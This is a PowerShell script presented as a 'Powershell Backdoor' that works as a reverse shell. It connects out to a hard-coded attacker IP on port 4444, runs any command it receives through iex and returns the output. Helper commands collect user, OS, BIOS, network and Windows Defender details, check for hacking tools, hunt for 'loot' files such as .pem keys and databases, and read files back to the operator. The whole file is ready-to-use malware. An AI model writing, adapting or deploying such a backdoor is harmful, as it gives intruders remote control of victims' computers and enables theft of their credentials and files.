<#

Powershell Backdoor
Coded by Drew Alleman
v0.0.0

[+] Fetching clients public ip address
[+] Listing local users
[+] OS Information
[+] BIOS Information
[+] Active TCP Clients
[+] Find Intresting Files
[+] Checks to see if common tools are installed

[-] Download Files from remote system
[-] Find Writeable Directories

#>

function get_tools() {
    $tools = @("nmap -h", "nc -h", "wireshark -v", "python3 -V", 
    "python -V", "perl -V", "ruby -h", "hashcat -h", "john -h", 
    "airmon-ng -h", "wifite -h", "sqlmap -h", "ssh", "gdb -h", 
    "radare2 -h", "dig -h", "whois -h", "gcc")
    if ($help -eq "--help") {
        return "Checks to see what tools are installed on the system"
    }
    $lines = ""
    foreach ($tool in $tools) {
        try {
            iex $tool | Out-Null
            $tool = $tool.Split(" ")[0]
            $lines += "[+] $tool is installed`n"
        } catch {

        }
    }
    return $lines

}

function get_loot($help, $directory) {
    if ($help -eq "--help") {
        return "Searches a directory for intresting files `nsyntax: get_loot --directory C:\"
    }
    $lines = ''
    $fileNames = Get-ChildItem $directory -Recurse -Include *.doc,*.pdf,*.json,*.pem,*.xlsx, *.xls, *.csv, *.txt *.db, *.exe
    foreach ($f in $fileNames) {
        $filename = $f.FullName
        $lines += "$filename `n"
    }
    return $lines
}

function get_users($help) {
    if ($help -eq "--help") {
        return "Lists all local users on the computer"
    }

    return Get-LocalUser | Select * | Out-String
}

function get_public_ip($help) {
    if ($help -eq "--help") {
        return "Makes a network request to api.ipify.org to fetch the computers public IP address"
    }
    return (Invoke-WebRequest -uri "https://api.ipify.org/").Content | Out-String
}

function get_bios($help) {
    if ($help -eq "--help") {
        return "Gets the BIOS's manufacturer name, bios name, and firmware type"
    }
    return  Get-ComputerInfo | select BiosManufacturer, BiosName, BiosFirmwareType  | Out-String
}

function get_active($help) {
     if ($help -eq "--help") {
        return "Lists active TCP connections"
    }   
    return Get-NetTCPConnection -State Listen  | Out-String
}

function get_os($help) {
     if ($help -eq "--help") {
        return "Gets infomation about the current OS build"
    }  
    return  Get-ComputerInfo | Select OsManufacturer, OsArchitecture, OsName, OSType, OsHardwareAbstractionLayer, WindowsProductName, WindowsBuildLabEx | Out-String
}


function get_antivirus($help) {
     if ($help -eq "--help") {
        return "Gets infomation about Windows Defender"
    } 
    return  Get-MpComputerStatus | Select AntivirusEnabled, AMEngineVersion, AMProductVersion, AMServiceEnabled, AntispywareSignatureVersion, AntispywareEnabled, IsTamperProtected, IoavProtectionEnabled, NISSignatureVersion, NISEnabled, QuickScanSignatureVersion, RealTimeProtectionEnabled, OnAccessProtectionEnabled, DefenderSignaturesOutOfDate | Out-String

}

function get_file($remote, $local, $help) {
     if ($help -eq "--help" -or $local -eq $null -or $remote -eq $null) {
        return "Downloads a remote file and saves it to your computer `nsyntax: get_file <remote_path> <local_path>`nPlease use absolute paths!"
    }
    try {
        $content = Get-Content -Path $remote
    } catch {
        $e = $_.Exception
        $msg = $e.Message
        $output = "`n$msg`n" 
        return $output 
    }
    return $content
}

function print_help() {
    return "
    get_antivirus - Gets infomation about Windows Defender
    get_os        - Gets infomation about the current OS build
    get_active    - Lists active TCP connections
    get_bios      - Gets the BIOS's manufacturer name, bios name, and firmware type
    get_public_ip - Makes a network request to api.ipify.org to and returns the computers public IP address
    get_loot      - Searches a directory for intresting files --help (syntax)
    get_tools     - Checks to see what tools are installed on the system
    get_file      - Downloads a remote file and saves it to your computer --help (syntax)
    "
}

class Backdoor {
    # Change this to the correct ip/port
    [string]$ipAddress = "192.168.0.225"
    [int]$port = 4444
    $stream 
    $client
    $writer
    $buffer
    $reader
    $encoding

    createConnection() {
        $this.client = New-Object Net.Sockets.TcpClient($this.ipAddress, $this.port);
        $this.stream = $this.client.GetStream();
        $this.buffer = New-Object Byte[] 1024;
        $this.encoding = New-Object Text.UTF8Encoding;
        $this.writer = New-Object IO.StreamWriter($this.stream, [Text.Encoding]::UTF8, 1024);
        $this.reader = New-Object System.IO.StreamReader($this.stream)
        $this.writer.AutoFlush = $true;
        $this.handleClient()

    }

    writeToStream($content) {
        [byte[]]$bytes  = [text.Encoding]::Ascii.GetBytes($content)
        $this.writer.Write($bytes,0,$bytes.length)     
    }

    handleClient() {
        $this.writeToStream("
     /| 
    / |ejm
   /__|______
  |  __  __  |
  | |  ||  | | 
  | |__||__| |== sh!
  |  __  __()|/      ...I'm not really here.
  | |  ||  | |       
  | |  ||  | |       [*] Use print_help to show all commands
  | |__||__| |       [*] Today's Date: $(date)
  |__________|`n`n")
        while ($this.client.Connected) {
                $currentUser = [Environment]::UserName
                $computerName = [System.Net.Dns]::GetHostName()
                $pwd = Get-Location
                $prompt = "$currentUser@$computerName [$pwd]~$ "
                $this.writeToStream($prompt)         
                $rawResponse = $this.stream.Read($this.buffer, 0, 1024)    
                $response = ($this.encoding.GetString($this.buffer, 0, $rawResponse))
                $output = "`n"
                if ([string]::IsNullOrEmpty($response)) {
                    continue
                }
                try { 
                    $output = iex $response | Out-String
                    $this.writeToStream($output + "`n")
                    }
                 catch {
                    $e = $_.Exception
                    $msg = $e.Message
                    $output = "`n$msg`n"  
                    $this.writeToStream($output + "`n")
                }
        }     
        # Clear the stream
        $this.stream.Flush()
        # Close the TCP socket
        $this.client.Close()
    }
}

$backdoor = [Backdoor]::new()
$backdoor.createConnection()
